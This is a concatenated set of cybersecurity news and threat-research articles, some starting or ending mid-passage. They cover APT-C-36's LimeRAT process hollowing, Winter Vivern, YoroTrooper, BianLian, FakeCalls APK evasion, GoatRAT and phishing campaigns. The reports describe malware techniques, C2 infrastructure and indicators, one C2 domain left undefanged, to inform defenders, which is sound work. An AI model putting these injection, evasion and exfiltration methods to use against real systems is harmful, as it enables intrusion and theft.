load in the memory of the powershell process the injector DLL and will invoke the PQHWQG method of the AGWNqj.ThUQsn class, passing it as arguments the path of the binary where it will inject the final payload and the LimeRAT payload downloaded previously.In this case, an obfuscation of the methods and variables of the loaded DLL is observed.Similarly, the same structure of infinite loops is observed with switch-case structures.It is noted that the defined extern are also obfuscated, although the logic is similar to the detailed NjRAT case study.Subsequently, as in the case study, the execution flow will be started, which will use the process hollowing technique to inject the LimeRAT payload into the RegAsm.exe process.As can be seen, a new RegAsm process has been created in a suspended state.In the following, in order not to extend the article too much, API calls have been omitted as they are similar to the case study detailed above. The only difference is that they have an obfuscation layer.A review of the memory of the RegAsm process shows that it has successfully injected the final payload.And as we can see, once the call to ResumeThread happens, the process has been correctly injected and some CPU consumption is observed.A review of the generated traffic shows connection attempts to LimeRAT’s C2 approximately every 2 sec.Note: The IP 192.0.2.123 is a simulated IP and does not correspond to the real IP to which prueba30novok.duckdns.org would resolve. In addition, the creation of a mutex is observed in the processes.The LimeRAT config is extracted in memory from the RegAsm process.Finally, once the injector has finished running, you can see that LimeRAT has been successfully injected and that the RegAsm process no longer depends on powershell.The analysis on the C2 infraestructures used by APT-C-36 until february 2023 are described in this section. In summary, it can be seen that in all six campaigns that all the C2 domains used have first resolved to an IP, either from a VPN service or a Hosting service:Subsequently, it is observed that in four of the six campaings resolves to an IP associated to an ISP, so as a hypothesis, it is likely that the router is used as a “reverse proxy” to hide the real C2.

      "title": "Winter Vivern | Uncovering a Wave of Global Espionage - SentinelOne",
      "text": " Our analysis of Winter Vivern’s past activity indicates that the APT has targeted various government organizations since 2021, including those in Lithuania, India, Vatican, and Slovakia.Recently linked campaigns reveal that Winter Vivern has targeted Polish government agencies, the Ukraine Ministry of Foreign Affairs, the Italy Ministry of Foreign Affairs, and individuals within the Indian government. Of particular interest is the APT’s targeting of private businesses, including telecommunications organizations that support Ukraine in the ongoing war.The threat actor’s targeting of a range of government and private entities highlights the need for increased vigilance as their operations include a global set of targets directly and indirectly involved in the war.Winter Vivern’s tactics have included the use of malicious documents, often crafted from authentic government documents publicly available or tailored to specific themes. More recently, the group has utilized a new lure technique that involves mimicking government domains to distribute malicious downloads.In early 2023, Winter Vivern targeted specific government websites by creating individual pages on a single malicious domain that closely resembled those of Poland’s Central Bureau for Combating Cybercrime, the Ukraine Ministry of Foreign Affairs, and the Security Service of Ukraine.In mid 2022 the attackers also made an interesting, lesser observed, use of government email credential phishing webpages. One example is ocspdep[.]com, which was used in targeting users of the Indian government’s legitimate email service email.gov.in.Looking back at less recent activity, we can see in December 2022 the group likely targeted individuals associated with the Hochuzhit.com (“I Want to Live”) project, the Ukraine government website offering guidance and instructions to Russian and Belarus Armed Forces seeking to voluntarily surrender in the war. In these attacks the threat actor made use of a macro-enabled Excel spreadsheet to infect the target.When the threat actor seeks to compromise the organization beyond the theft of legitimate credentials, Winter Vivern tends to rely on shared toolkits, and the abuse of legitimate Windows tools.Winter Vivern APT falls into a category of scrappy threat actors, being quite resourceful and able to accomplish a lot with potentially limited resources while willing to be flexible and creative in their approach to problem-solving.Recent campaigns demonstrate the group’s use of lures to initiate the infection process, utilizing batch scripts disguised as virus scanners to prompt downloads of malware from attacker-controlled servers.In the case of malicious documents, such as the Hochu Zhit themed XLS files, PowerShell is called through a macro. Specifically, Invoke-Expression cmdlet is executed, beaconing to the malicious destination of ocs-romastassec[.]com/goog_comredira3cf7ed34f8.php.One malware family of recent activity is APERETIF, named by CERT-UA based on the development PDB path inside the sample. We identified a related sample following similar use, although it is less complete in malicious design. These samples align with the theme of attacks mimicking a virus scanner, presenting users with the fake scan results similar to the script loaders. Known samples are PE32 executables, written in Visual C++, with a compilation timestamp of May 2021. We assess the threat actor shifted from these original executables to the delivery of batch files with PowerShell scripting, with overlap in their use.APERETIF is a trojan, automating the collection of victim details, maintaining access, and beaconing outbound the actor-controlled domain marakanas[.]com. As with the previous script, the trojan makes use of whomami within PowerShell in its initial activity to beacon outbound for further instructions and/or downloads.APERETIF also uses the signatures.php?id=1 URI through HTTPS GET requests. The group made use of compromised WordPress websites to host the malware, such as with hxxps://applesaltbeauty[.]com/wordpress/wp-includes/widgets/classwp/521734i and hxxps://natply[.]com/wordpress/wp-includes/fonts/ch/097214o serving as the download location for APERETIF during initial attack stages.Moreover, Winter Vivern employs other intrusion techniques, such as exploiting application vulnerabilities to compromise specific targets or staging servers. An attacker-controlled server was found to host a login page for the Acunetix web application vulnerability scanner, which may serve as a supplementary resource for scanning target networks and potentially used to compromise WordPress sites for malware hosting purposes.The Winter Vivern cyber threat actor, whose operations of espionage have been discussed in this research, has been able to successfully carry out their attacks using simple yet effective attack techniques and tools. Their ability to lure targets into the attacks, and their targeting of governments and high-value private businesses demonstrate the level of sophistication and strategic intent in their operations. The dynamic set of TTPs and their ability to evade the public eye has made them a formidable force in the cyber domain.Get notified when we post new content.Thanks!

      "text": " The BianLian ransomware group has shifted its focus from encrypting its victims' files to only exfiltrating data found on compromised networks and using them for extortion.Redacted reports that BianLian operators have kept their initial access and lateral movement techniques the same and continue to deploy a custom Go-based backdoor that gives them remote access on the compromised device, albeit a slightly improved version of it.The threat actors post their victims in masked form as quickly as 48 hours after the breach on their extortion site, giving them roughly ten days to pay the ransom.As of March 13, 2023, BianLian has listed a total of 118 victim organizations on their extortion portal, with the vast majority (71%) being U.S.-based companies.The main difference seen in recent attacks is that BianLian attempts to monetize its breaches without encrypting the victim's files. Instead, it now solely relies on threatening to leak the stolen data.\"The group promises that after they are paid, they will not leak the stolen data or otherwise disclose the fact the victim organization has suffered a breach. BianLian offers these assurances based on the fact that their \"business\" depends on their reputation,\" mentions Redacted in the report.\"In several instances, BianLian made reference to legal and regulatory issues a victim would face were it to become public that the organization had suffered a breach. The group has also gone so far as to include specific references to the subsections of several laws and statutes.\"Redacted has found that in many cases, the law references made by BianLian operators were applicable in the victim's region, indicating that the threat actors are honing their extortion skills by analyzing a victim's legal risks to formulate strong arguments.It is unknown if BianLian abandoned the encryption tactic because Avast broke their encryptor or because this event helped them realize they didn't need that part of the attack chain to extort victims into paying ransoms.It should be mentioned that when Avast released its free decryptor, BianLian downplayed its importance, saying it would only work on early \"summer 2022\" versions of the ransomware and would corrupt files encrypted by all subsequent builds.Encrypting files, data theft, and threatening to leak stolen files is known as a \"double extortion\" tactic, which serves as an additional form of coercion for ransomware gangs looking to increase pressure on their victims.However, through the natural exchange between threat actors and victims, ransomware gangs realized that, in many cases, sensitive data leak was an even stronger payment incentive for victims.Still, most ransomware groups continue using encryption payloads in their attacks, as the business disruption caused by encrypting devices puts even greater pressure on many victims."

      "text": "  Researchers for the contextual AI company said the videos lure users by pretending to be tutorials on how to download cracked versions of software only available to paid users such as Photoshop, Premiere Pro, Autodesk 3ds Max and AutoCAD. The threat actors use previous data leaks, phishing techniques and stealer logs to take over existing YouTube accounts.‍The threat actors tend to target popular accounts with more than 100,000 subscribers so they can reach a large audience in a short time. Usually, subscribers to popular accounts are notified about a new upload, a tactic that lends itself to video legitimacy. However, many YouTubers report this unusual activity to YouTube and gain access back to their accounts within a few hours. The bad news: in a few hours, hundreds of users could have fallen prey.  Matthew Fulmer, manager of cyber intelligence engineering at Deep Instinct, said he compares this case to an advanced phishing campaign that’s very broad in scope.“The use of AI to include digitally generated humans is an interesting touch, especially if they are generating them based on the generally accepted symmetry which makes people find them ‘attractive,’ and thus ‘soothing’ or ‘trusting,’” said Fulmer. “Threat actors can leverage this heavily and the tools they are now starting to leverage should worry security teams as the threat actors are advancing far more rapidly than most of the security teams.”Timothy Morris, chief security advisor at Tanium, added that AI’s ability to create believable content via video, audio and text has upped the malware game, giving attackers better lures to attract and hook victims.Morris said the videos with AI are just another info-stealer technique used to deceive and manipulate people by exploiting their appetite for a deal, or to get something for nothing.  “Remember that nothing is free,” said Morris. “If you’re being asked to download software, an extension/plug-in, or share data in hopes of receiving something of value, it’s you that has become the product and your data is the commodity.\"Sharing too much information exposes oneself to spearphishing and ransomware,\" Morris continued. \"And with the blurred lines between work and home, some info stealers are even geared towards siphoning Wi-Fi router data.”The new PCI DSS standard puts more focus on application security, with more tools, testing and documentation required of developers.After admitting responsibility for compromising Sony, a Colonial Pipeline supplier, and a Hawai'i government site, the RansomedVC group has claimed that it will be ending operations due to the arrests of six of its affiliates, reports The Record, a news site by cybersecurity firm Recorded Future.Ukraine had experienced a less than a day-long power outage in October 2022 following an attack by Russian state-sponsored hacking operation Sandworm targeted at an electrical substation amid the ongoing Russia-Ukraine war, marking the first cyberattack-related power interruption in the country since 2017, CyberScoop reports.   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "text": " Cybersecurity firm Kaspersky on Thursday released a decryptor that could help victims who had their data locked down by a version of the Conti ransomware.Experts with the company managed to obtain the ransomware’s private keys – tools given to ransomware victims that allow them to unlock their files.“In late February 2023, Kaspersky experts uncovered a new portion of leaked data published on forums,” the company said. “After analyzing the data, which contained 258 private keys, source code and some pre-compiled decryptors, Kaspersky released a new version of the public decryptor to help victims of this modification of Conti ransomware.”The analysts found the private keys in 257 different folders – one of the folders had two keys. Several of the folders had decryptors and files used to test the decryptor.At least 34 of the folders had the names of companies or government agencies and Kaspersky officials said that considering the number of folders with decryptors, they believe 14 victims of the 257 paid a ransom.“For many consecutive years, ransomware has remained a major tool used by cybercrooks. However, because we have studied the TTPs of various ransomware gangs and found out that many of them operate in similar ways, preventing attacks becomes easier,” Sinitsyn said.Recorded Future ransomware expert Allan Liska said based on the numbers released by Kaspersky, there were a surprisingly low number of victims who paid the ransom.\nHe added that Kaspersky’s work was evidence that ransomware groups themselves typically have lackluster security.“For all the scolding by ransomware groups of victim organizations we continue to see that ransomware groups themselves are really bad at security. I think poor OPSEC has done in almost as many ransomware groups as government intervention,” he said.“This is great work by Kaspersky and hopefully we will continue to see more of this type of activity by the public and private sectors. It looks like Kaspersky may have had access to their infrastructure, at least enough to be able to identify victims.”Kaspersky noted that after the Conti source code was leaked, several different variants were created by various criminal gangs.Jonathan Greig is a Breaking News Reporter at Recorded Future News.

      "text": " Project Zero, Google's zero-day bug-hunting team, discovered and reported 18 zero-day vulnerabilities in Samsung’s Exynos chipsets used in mobile devices, wearables, and cars.The Exynos modem security flaws were reported between late 2022 and early 2023. Four of the eighteen zero-days were identified as the most serious, enabling remote code execution from the Internet to the baseband.These Internet-to-baseband remote code execution (RCE) bugs (including CVE-2023-24033 and three others still waiting for a CVE-ID) allow attackers to compromise vulnerable devices remotely and without any user interaction.To make things even worse, with minimal additional research, experienced attackers could easily create an exploit capable of remotely compromising vulnerable devices without triggering the targets' attention.The 14 remaining flaws (including CVE-2023-24072, CVE-2023-24073, CVE-2023-24074, CVE-2023-24075, CVE-2023-24076, and nine others awaiting CVE-IDs) are not as critical but still pose a risk. Successful exploitation requires local access or a malicious mobile network operator.Based on the list of affected chipsets provided by Samsung, the list of affected devices includes but is likely not limited to:While Samsung has already provided security updates addressing these vulnerabilities in impacted chipsets to other vendors, the patches are not public and can't be applied by all affected users.Each manufacturer's patch timeline for their devices will differ but, for instance, Google has already addressed CVE-2023-24033 for impacted Pixel devices in its March 2023 security updates.However, until patches are available, users can thwart baseband RCE exploitation attempts targeting Samsung's Exynos chipsets in their device by disabling Wi-Fi calling and Voice-over-LTE (VoLTE) to remove the attack vector.Samsung also confirmed Project Zero's workaround, saying that \"users can disable WiFi calling and VoLTE to mitigate the impact of this vulnerability.\"\"As always, we encourage end users to update their devices as soon as possible, to ensure that they are running the latest builds that fix both disclosed and undisclosed security vulnerabilities,\" Willis added."

      "text": " Android malware 'FakeCalls' is circulating again in South Korea, imitating phone calls for over 20 financial organizations and attempting to fool bankers into giving away their credit card details.\"The malware developers paid special attention to the protection of their malware, using several unique evasions that we had not previously seen in the wild.\"The first step of the attack is the installation of malware on the victim's device, which might happen via phishing, black SEO, or malvertizing.The FakeCalls malware is distributed on fake banking apps that impersonate large financial institutions in Korea, so victims think they are using a legitimate app from a trustworthy vendor.The attack begins with the app offering the target a loan with a low-interest rate. Once the victim is interested, the malware initiates a phone call that plays a recording from the bank's real customer support with instructions on getting the loan request approved.However, the malware can mask the called number, which belongs to the attackers, and instead displays the impersonated bank's real number, making the conversation appear realistic.At some point, the victim is tricked into confirming their credit card details, supposedly required for receiving the loan, which are then stolen by the attackers.In addition to the vishing process, FakeCalls can capture live audio and video streams from the compromised device, which could help the attackers collect additional information.In the latest samples captured and analyzed by CheckPoint's researchers, FakeCalls incorporates three new techniques that help it evade detection.The first mechanism is called 'multi-disk,' which involves manipulating the ZIP header data of the APK (Android package) file, setting abnormally high values for the EOCD record to confuse automated analysis tools.The second evasion technique involves the manipulation of the AndroidManifest.xml file to make its starting marker indistinguishable, modify the strings and styles structure, and tamper with the last string's offset to cause incorrect interpretation.Finally, the third evasion method is to add many files inside nested directories in the APK's asset folder, resulting in file names and paths surpassing 300 characters. Check Point says this can cause problems for some security tools, causing them to fail to detect the malware.While FakeCalls has stayed in South Korea, the malware could easily expand its operations to other regions if its developers or affiliates develop a new language kit and app overlay to target banks in different countries.Vishing has always been a dire problem, but the rise of machine-learning speech models that can generate natural speech and mimic real persons' voices with minimal training data input is poised to magnify the threat shortly."

      "text": " A new espionage campaign by a hacking group with suspected ties to Moscow targeted government agencies and telecom operators in Ukraine, India and Europe, researchers said Thursday.Winter Vivern recently targeted various government agencies and private businesses, including telecom companies supporting Ukraine, SentinelOne said. The list includes Polish government agencies, the foreign ministries of Ukraine and Italy, and individuals in the Indian government.In December, the group also focused on individuals linked to a Ukrainian government website that provides guidance and instructions to Russian and Belarusian soldiers who want to surrender voluntarily during the war in Ukraine.Analysts began to track Winter Vivern in 2021, but the group — classified as an advanced persistent threat (APT) — had been quiet since then, SentinelOne said. Cybersecurity agencies in Poland and Ukraine collaborated with SentinelOne on the latest research, the company said.Winter Vivern hackers used fake websites and distributed malicious documents that were customized to the specific needs of a targeted organization, researchers said. Examples include:• Attempting to infect Ukrainian government computer systems with malware hosted on websites impersonating legitimate state services.• Creating a webpage for credential phishing to target users of the email service used by the Indian government.• Disguising Windows batch files — often used to automate routine tasks or execute a series of commands — as antivirus scanners and using them to download malicious payloads into victims' devices.One of the malware strains delivered in these attacks is called Aperetif. It is hosted on compromised WordPress websites that are commonly used for malware distribution.A spokesperson for the agency told The Record they could not share details about how many devices were infected or what information was stolen.It is also unclear how successful the group's attacks were and what damage they caused. SentinelOne did not respond Thursday morning to The Record's request for comment.The research report said that organizations directly or indirectly involved in the war should be vigilant against the group’s cyberattacks.“Their ability to lure targets into the attacks and their targeting of governments and high-value private businesses demonstrate the level of sophistication and strategic intent in their operations,” the researchers said.Daryna Antoniuk\nis a freelance reporter for Recorded Future News based in Ukraine.

      "text": " Cybercriminals are abusing Adobe Acrobat Sign, an online document signing service, to distribute info-stealing malware to unsuspecting users.The service is being abused to send malicious emails that originate from the software company to bypass security protections and trick recipients into trusting the received email.Adobe Acrobat Sign is a free-to-try cloud-based e-signature service allowing users to send, sign, track, and manage electronic signatures.Threat actors register with the service and abuse it to send messages to target email addresses, which link to a document (DOC, PDF, or HTML) hosted on Adobe's servers (\"eu1.documents.adobe.com/public/\").The documents contain a link to a website that requests visitors to solve a CAPTCHA to add legitimacy and then serve them a ZIP archive that includes a copy of the Redline information stealer.Redline is a dangerous malware capable of stealing account credentials, cryptocurrency wallets, credit cards, and other information stored on the breached device.Avast has also spotted highly targeted attacks employing this method, like in one case where the target owned a popular YouTube channel with many subscribers.Clicking on the link of the specifically-crafted message sent via Adobe Acrobat Sign took the victim to a document claiming music copyright infringement, a common and believable theme for YouTube channel owners.This time, the document was hosted on dochub.com, a legitimate online document signing platform.The link in the document leads to the same CAPTCHA-protected website that drops a copy of Redline.In this case, however, the ZIP also contained several non-malicious executables from the GTA V game, likely an attempt to trick AV tools by mixing the payload with innocuous files.Avast has shared all details of its findings with Adobe and dochub.com, and hopefully, the two services will find a way to stop abuse from malware operators."

      "text": " Another Android banking Trojan with the capability to make instant unauthorized money transfers is targeting Brazilian banks as part of a growing trend among threat actors to exploit a new automated payment system in Latin America.So far, the Cyble researchers have observed the RAT — which they said was created first as an Android remote administration tool to take control over victims' devices — targeting three Brazilian banks: NUBank, Banco Inter, and PagBank.Making automated transfers appears to be the sole aim of the Trojan, which unlike similar malware doesn't include the ability to steal authentication codes or incoming SMS messages, according to the findings.The malware is part of a growing trend by threat actors over the last six months to create more sophisticated banking malware that includes an automatic transfer system (ATS) framework, \"allowing attackers to conduct unauthorized money transfers on infected devices,\" the Cyble researchers wrote.GoatRAT typically uses a four-step process to perform automated transfers once it infects a user's device. The researchers outlined the system used specifically for the Banco Inter mobile banking application; however, the Trojan also has incorporated similar functions to carry out automatic transfers for the other banking applications, such as NUBank and PagBank, that it targets, they said.GoatRAT first abuses the Accessibility Service on an Android device to verify that the name of the active package matches one of a list of targeted application package names, and then deploys a further infection.Once the targeted app is identified, the malware creates a fake banking overlay window that appears above the legitimate application to hide its malicious activity from the victim. This and another covert process allow the Trojan to enter an amount of money to transfer as well as the device's Pix key into the legitimate banking app without alerting the victim, the researchers said.The malware also introduces an automatic clicking mechanism for the “Confirm” and “Pay” buttons of the legitimate banking app to complete the instant money transfer. Once this transfer is complete, it removes the overlay window from the top of the legitimate banking app and the malicious process is concluded.Researchers made several security recommendations that go along with typical best practices for downloading and using mobile applications to keep devices free of infection from Trojans and other malware that not only can steal funds but also spread to enterprise networks through connected devices.Mobile device users should only download and install software from official app stores like Google Play Store or the iOS App Store, and use a reputed antivirus and Internet security software package on all connected devices, including not only mobile but also on PCs and laptops, the researchers advised.They also recommended users never share details for payment cards with untrusted sources and use strong passwords and enforce multifactor authentication (MFA) on mobile devices wherever possible. Further, implementing biometric security features such as fingerprint or facial recognition for unlocking their mobile devices wherever possible, is key, the researchers said.Other commonsense security rules that researchers advised but which users often ignore are to keep devices, operating systems, and apps updated, and avoid opening links received via SMS or emails delivered to mobile devices. Users should take care when enabling any permissions on devices, and ensure that Google Play Protect is enabled on Android devices, the Cyble researchers added.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": "  On Feb. 13, MKS discovered it was the victim of a ransomware attack, which impacted business systems and delayed or disrupted the company’s ability to process orders, ship products and provide other services, according to comments made by CEO John Lee in a Feb. 28 earnings call.A footnote claims that the plaintiff is filing under the name “John Doe” based on California laws that allows the use of pseudonyms in cases involving healthcare information in order to protect their privacy and prevent harassment of a healthcare patient. The suit claims that by not adequately protecting that information, MKS Instruments violated data protection requirements in the California Confidentiality of Medical Information Act, the California Consumer Privacy Act and other state laws. It also claims that the company may have stored such data in an unencrypted state, allowing hackers to make off with usable information that could lead to identity theft, fraud and other threats for affected victims.The lawsuit is seeking unspecified monetary damages and payment of attorney fees resulting from the incident.“MKS had the resources necessary to protect and preserve confidentiality of Plaintiff’s and the Class’ medical information and personal information in their possession, but neglected to adequately implement data security measures as required by the CCPA and the CMIA, despite their obligation to do so,” the complaint states.The complaint cites a notification sent by MKS Instruments to the affected parties stating that the company was investigating the incident and could not rule out the possibility that personal data for employees and others may have been exfiltrated.What data may have actually been stolen is unknown at this time, but the universe of information potentially exposed is vast. Among the information listed by the company were names, contact information, addresses, government ID numbers, work login credentials and passwords, marital status, veteran status, nationality, immigration status, race, religious beliefs, education, employment history, dates of birth, gender, sexual orientation, bank account information, payment card information, compensation and equity, hours worked, information about disabilities, health and medical conditions, health insurance information, and children and emergency contacts.   The company reported it has taken on a variety of costs associated with the event, including hiring of third-party consulting services, forensic experts, restoration experts, legal counsel, and other information technology and accounting professional expenses, enhancements to our cybersecurity measures, costs to restore systems and access data, and employee-related expenses like increased overtime.Terry Dennehy, vice president and senior credit officer for Moody’s Investors Service, said the ransomware attack and fallout was “credit negative” for the business.“The financial ramifications, temporary manufacturing delays, and the class action lawsuit underscore the potential cascading impacts of any cyber incident and the need to bolster cybersecurity across the industry,” Dennehy said in a statement.The filing also noted that it’s possible additional lawsuits or government sanctions could arise as a result of the attack.“While we intend to vigorously defend this lawsuit, and any additional such lawsuits, in light of the inherent uncertainties involved in such proceedings, we may incur losses associated with any such proceedings,” the company stated.Tyson Benson, an intellectual property and cybersecurity attorney at ZF Group, told SC Media that despite the fact that the lawsuit is being led by a former employee, there are few specific allegations demonstrating direct negligence on the part of MKS Instruments. While ransomware attacks typically involve the exfiltration of sensitive data, the company's notice only said that such data may have been stolen. Meanwhile, the complaint doesn't offer any direct evidence that personal data was left unencrypted, and that claim appears to be an inference on the part of the plaintiff's lawyers based on MKS' notification letter.\"There's no specific facts that the complaint points to. This very well could be a situation where MKS had all their stuff exfiltrated: trade secrets, confidential information, personal data of all their employees — but we don't know that,\" said Benson. \"That's what discovery is for and that's what the argument would be ... but this is one of those [cases that] is lacking on specifics.\"A call to one of the law firms representing the plaintiffs, Cohelan, Khoury and Singer, was not returned by press time. A public relations firm representing MKS sent SC Media a statement saying “as a matter of policy, we don’t comment on pending litigation.”Derek is a senior editor and reporter at SC Media, where he has spent the past three years providing award-winning coverage of cybersecurity news across the public and private sectors.

      "title": "Analysts Spot a Wave of SVB-Related Cyber Fraud Striking the Business Sector",
      "text": " Right now, hackers are developing phishing campaigns that capitalize on the news of Silicon Valley Bank's failure.SVB was the 16th-largest bank in the United States, known primarily for servicing Silicon Valley startups and technology companies, including such name brands as Buzzfeed, Roblox, Trustpilot, and Roku. A chain reaction beginning with global inflation and ending with a run on deposits saw regulators shut down the bank on Friday.Indeed, analysts have picked up on a wave of SVB-related attacks this week — phishing and otherwise — with dozens of new threats arising daily. And, unfortunately, perfectly legitimate companies are actually, unwittingly, helping the attackers along.Oren Koren, CPO and co-founder of Veriti, saw the data start to flow in right away. \"Hackers started on March 10 and 11, buying domains that are very close to domains related to SVB,\" he says. The domains reference payments, or a bailout, or try to mimic legitimate SVB domains — such as, Benshiti says, \"svblogin[.]com\" and \"login-svb[.]com\". Sometimes, hackers take a less tactful approach — something like \"wefinancesvbclients[.]com.\"Koren observed as the perpetrators, having registered their lookalike domains, created and tested their phishing attack flows. \"Before you deploy, you create a phishing process, and then you test it on yourself to verify it works,\" he explains.In one case, a malicious actor tipped their hand by clearly testing their infrastructure from Turkey. \"That was a mistake, and that's why we know he started there, and then eventually moved to target the US,\" he notes. In all, Koren has observed attacks from two major groups, in addition to some smaller entities.As of this writing, Veriti has tracked more than 62 new domains registered for SVB-related attacks, and 200 phishing attacks in all, primarily against targets in the United States (understandable, as most of SVB's clients are US-based companies).The analysts who spoke with Dark Reading emphasized the many ways in which the public response to SVB is actually making hackers' jobs easier.Koren made note of websites like affectedbysvbornot.com and svbmeltdown.fyi, which have been publishing lists of customers affected by SVB, and how badly they were exposed. \"It's important from a publication perspective,\" he admits, \"but for attackers, those services allow them to know better whom they should target.\" Attackers can use specific details from these websites to help legitimize their phishing emails, or scale ransom payments according to how much money they see these companies stowing away in their coffers.Ryan Kalember, executive vice president of cybersecurity strategy for Proofpoint, points to an even more subtle problem. As SVB customers shift to other banks, they're having to inform clients and vendors about new channels for payments. Those notifications, sometimes, aren't so distinguishable from phishing.Take the perfectly honest email below — a vendor notifying clients that, due to SVB's failure, payments should be sent to a new bank account. \"As a result of that news,\" it reads, \"we are asking that with immediate effect your Company's payments that we previously directed be paid to Silicon Valley Bank, now be paid in accordance with the attached letter from our Finance Department.\"\"So actually, the email is extremely unhelpful,\" Kalember explains, \"because even if it provides the right account details, it looks so much like phishing,\" from the language right on down to the minor details. \"It even looks extremely malicious, because of the .docx.pdf.\"Kalember had to deal with this payment problem first hand — not just from a security analyst's perspective — since his own company had limited exposure to SVB. When notifying relevant clients, he advises a more careful approach. \"What the email should say is: 'Please call us in a pre-recognized fashion, to an official and indisputably legitimate phone number. And we will discuss kind where we should go from a payment perspective going forward.'\"To address the broader issue of SVB-related attacks, Benishti highlighted the need for a security-forward culture, and reviewing internal security processes. \"Companies should also have robust systems in place,\" he says, \"to detect fake login pages and prevent credential harvesting, which will be a featured play with SVB-related scams.\"Koren thinks the solution is even simpler. He gave an example of one organization that's already targeted in an SVB phishing campaign. \"They had anti-phishing in their mail security,\" he points out, alongside robust endpoint and network security solutions. \"Unfortunately, in this case, their security was not maximized. The phishing email got through. They have all the technologies necessary to protect from those kinds of attacks, they specifically just hadn't used it, because they were not aware that they have a technology to do anti-phishing.\"Most organizations, Koren says, are in a similar position. \"So the goal is to maximize what you have, from a security perspective, or use automations and AI just to do that.\" As SVB-related campaigns continue to rise, companies will certainly need to maximize what security they already have.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

The hackers would have deployed malware that month, and weeks later began introducing trojanized copies of the Q-Dir installers.The APT group then compromised the targeted company’s network in June and September 2021, transferring the trojanized Q-dir installers to customers of the compromised company in February and June 2022.“Based on Tick’s profile and the compromised company’s high-value customer portfolio, the objective of the attack was most likely cyber espionage,” Muñoz wrote. How the DLP company was first compromised is currently unknown. Still, ESET hypothesized the firm’s customers were receiving technical support via a remote support application and the malicious installer was used unknowingly on customer machines.“It is unlikely that the attackers installed support tools to transfer the trojanized installers themselves,” Muñoz added."

      "text": " This new threat actor we are naming “YoroTrooper” has been targeting governments across Eastern Europe since at least June 2022, and Cisco Talos has found three different activity clusters with overlapping infrastructure that are all linked to the same threat actor. Cisco Talos does not have a full overview of this threat actor, as we were able to collect varying amounts of detail in each campaign. In some cases, for instance, we were able to fully profile a campaign, while in other cases, we only identified the infrastructure or compromised data.Our assessment is that the operators of this threat actor are Russian language speakers, but not necessarily living in Russia or Russian nationals since their victimology consists mostly of countries in the Commonwealth of Independent States (CIS). There are also snippets of Cyrillic in some of their implants, indicating that the actor is familiar with the language. Also, in some cases, the attackers are targeting Russian language endpoints (with Code Page 866), indicating a targeting of individuals speaking that specific language.Espionage is the main motivation for this threat actor, according to the tactics, techniques and procedures (TTPs) we have analyzed. To trick their victims, the threat actor either registers malicious domains and then generates subdomains or registers typo-squatted domains similar to legitimate domains from CIS entities to host malicious artifacts. The table below contains some of the domains created by this actor.The initial attack vectors are phishing emails with a file attached, which usually consists of an archive consisting of two files: a shortcut file and a decoy PDF file. The shortcut file is the initial trigger for the infection, while the PDF is the lure to make the infection look legitimate. The full details of the campaigns are detailed in the section below.Phishing email example. YoroTrooper also successfully compromised embassies belonging to Turkmenistan and Azerbaijan, where the operators attempted to exfiltrate documents of interest and deploy additional malware. Typically, YoroTrooper employs information stealers and RATs. An analysis of their stolen data reveals a treasure trove of information stolen from infected endpoints, such as credentials, histories and cookies for multiple browsers. Information such as credentials is highly valuable as they may be used either during lateral movement efforts or during subsequent YoroTrooper campaigns. Browsing histories can be used by a threat actor to specifically target victims with phishing lures based on their browsing habits. While there are no concrete links between operators of PoetRAT and YoroTrooper, such as infrastructure overlaps, there are some similarities in their TTPs and victimology. Both actors use open-source tools to perform credential exfiltration and initial reconnaissance. In terms of bespoke tools, both threat actors have an affinity towards using Python-based implants, usually distributed, implemented or packed in a rather unusual way that is characteristic of the respective threat actors. The PoetRAT team would append the Python interpreter to a malicious document that would be extracted and used to execute the Python-based PoetRAT. YoroTropper used the Nuitka framework to pack their custom credential stealer in such a weird way that it ended up leaking the Python code rather than obfuscating it.Regarding victimology, there are some noteworthy overlaps between YoroTrooper and the PoetRAT team, who mainly target Azerbaijan, specifically their embassies, energy sector and government institutions. YoroTropper is also targeting Azerbaijan and other CIS countries, and their embassies, with a similar focus on the energy sector. This threat actor extensively targets CIS countries using a variety of malware deployed by a relatively simple infection chain.

All these tasks are accomplished by running PowerShell-based commands.Malicious HTA.YoroTrooper has been consistently introducing new malware into their infection chains in this campaign, including both custom-built and commodity malware. It is worth noting that while this campaign began with the distribution of commodity malware such as AveMaria and LodaRAT, it has evolved significantly to include Python-based malware. This highlights an increase in the efforts the threat actor is putting in, likely derived from successful breaches during the course of the campaign.The custom-built Python-based RAT is relatively simple. It uses Telegram as a medium of C2 communication and exfiltration and contains functionality to:This bot was wrapped up into a .exe either using PyInstaller or Nuitka and then deployed in the field. There are some interesting observations here suggesting that the adversary may be speak Russian:Snippet: Python based RAT used by YoroTrooper. YoroTrooper has relied heavily on the use of primarily two commodity malware families,  AveMaria/Warzone RAT and LodaRAT, especially in October and November 2022. AveMaria is a highly prolific malware family available for sale online, while LodaRAT is a RAT-based family whose authorship has been attributed to the Kasablanka threat actor. Stink has several modules from Chromium-based browsers that collect credentials, cookies and bookmarks, among other information. It harvests Filezilla credentials and authentication cookies from Discord and Telegram. From the system, the stealer will collect a screenshot, external IP address, operating system, processor, graphic card and running processes:All modules are executed in their own process and even each process will use its own threads to speed up the information collection process. The information is stored in a temporary directory before being compressed and exfiltrated.The sender module is responsible for data exfiltration via a Telegram bot. As of early March, the latest version of Stink Stealer 2.1.1 has an autostart configuration option that will create a link in the startup folder of the victim profile with the name “Windows Runner.”Autostart configuration options.Apart from commodity malware, we’ve also observed YoroTrooper deploy implants serving as reverse shells against their targets. For example, in September 2022, we saw a simple Python-based reverse shell. This one, however, was missing the Cyrillic language check (CP866).Another set of reverse shell implants that YoroTrooper occasionally uses are Meterpreter binaries that are then used to execute arbitrary commands on the infected endpoint. This tactic was seen being used by YoroTrooper as late as February 2023.A C-based custom keylogger also discovered by Talos probably deployed by one of the final stage payloads consists of the ability to record keystrokes and save them to a file on disk.Snippet: Keylogger functionality.Ways our customers can detect and block this threat are listed below.Cisco Talos has recently observed an increase in spam messages abusing a feature of quizzes created within Google Forms.Knowing the common scams is an important step in using the platform safely. The following recommendations help players not fall into scams.Since April 2022, Cisco Talos has been tracking a malicious campaign operated by the espionage-motivated Arid Viper advanced persistent threat (APT) group targeting 